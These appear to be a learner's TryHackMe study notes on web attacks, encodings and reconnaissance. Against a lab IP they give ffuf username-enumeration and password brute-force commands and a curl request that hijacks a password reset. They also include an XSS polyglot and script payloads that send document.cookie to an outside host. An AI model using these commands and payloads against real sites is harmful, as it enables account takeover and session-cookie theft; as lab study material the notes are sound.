# Commands

```powershell

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.215.241/customers/signup -mr "username already exists"

```

In the above example, the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.

```powershell
# brute force attack
ffuf -w ./HackingPython/THM-WordsList/valid-usernames.txt:W1,./SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d  "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.215.241/customers/login -fc 200
```

This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.

curl 'http://10.10.215.241/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=paolo@customer.acmeitsupport.thm'

## XSS polyglot

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
```html
</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
</textarea><script>fetch('http://10.10.10.100/?cookie=' + btoa(document.cookie) );</script>
</textarea><script>fetch('http://ff3eff8746b0e6d2ba0fbfe277f7d9c2.log.tryhackme.tech?cookie=' + btoa(document.cookie) );</script>
```

## Encoding Information

Different type of encoding:

- Plain: Plaintext is what we have before performing any transformations.
- URL: URL encoding is used to make data safe to transfer in the URL of a web request. It involves exchanging characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). Url encoding is an extremely useful method to know for any kind of web application testing.
For example, let's encode the forward-slash character (/). The ASCII character code for a forward slash is 47. This is "2F" in hexadecimal, making the URL encoded forward-slash %2F. We can confirm this with Decoder by typing a forward slash in the input box, then selecting Encode as -> URL:
- HTML: Encoding text as HTML Entities involves replacing special characters with an ampersand (&) followed by either a hexadecimal number or a reference to the character being escaped, then a semicolon (;). For example, a quotation mark has its own reference: &quot;. When this is inserted into a webpage, it will be replaced by a double quotation mark ("). This encoding method allows special characters in the HTML language to be rendered safely in HTML pages and has the added bonus of being used to prevent attacks such as XSS (Cross-Site Scripting).
- Base64: Another widely used encoding method, base64 is used to encode any data in an ASCII-compatible format. It was designed to take binary data (e.g. images, media, programs) and encode it in a format that would be suitable to transfer over virtually any medium. How this works under the hood is not important at this point; however, if you are interested, you can read the maths behind it [here](https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/).
- ASCII Hex: This option converts data between ASCII representation and hexadecimal representation. For example, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each letter in the original data is taken individually and converted from numeric ASCII representation into hexadecimal. For example, the letter "A" in ASCII has a decimal character code of 65. In hexadecimal, this is 41. Similarly, the letter "S" can be converted to hexadecimal 53, and so on.
- Hex, Octal, and Binary: These encoding methods all apply only to numeric inputs. They convert between decimal, hexadecimal, octal (base eight) and binary.
- Gzip: Gzip provides a way to compress data. It is widely used to reduce the size of files and pages before they are sent to your browser. Smaller pages mean faster loading times, which is highly desirable for developers looking to increase their SEO score and avoid annoying their customers. Decoder allows us to manually encode and decode gzip data, although this can be hard to process as it is often not valid ASCII/Unicode.
- Hex Format, Inputting data in ASCII format is great, but sometimes we need to be able to edit our input byte-by-byte. For this, we can use "Hex View" by choosing "Hex" above the decoding options;

## Network Security

Things to remember:
- passive reconnaissance
- active reconnaissance
- nmap live host discovery
- nmap basic port scans
- nmap advanced port scans
- nmap post port scans
- protocols and server
- network security challenge

<bold>Reconnaisance</bold>

It's about getting information about the system to hack, it is divided in passive and active.
- passive: In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target. Think of it like you are looking at target territory from afar without stepping foot on that territory.

- active: cannot be achieved so discreetly. It requires direct engagement with the target. Main activities: a) Connecting to one of the company servers such as HTTP, FTP, and SMTP, 2) Calling the company in an attempt to get information (social engineering) and c) Entering company premises pretending to be a repairman.

WHOIS is a request and response protocol that follows the RFC 3912 specification. A WHOIS server listens on TCP port 43 for incoming request


```powershell
whois
nslookup # query dns database records
dig # query database dns records
```

## Reference

[](https://crackstation.net/)  
[RCE Payloads](https://github.com/payloadbox/command-injection-payload-list)  
[dns dumpster](https://dnsdumpster.com/)  
[shodan.io](https://www.shodan.io/)  
[unified kill chain](https://www.unifiedkillchain.com/)  
[DNSSEC](https://blog.apnic.net/2020/03/02/dnssec-validation-revisited/)  


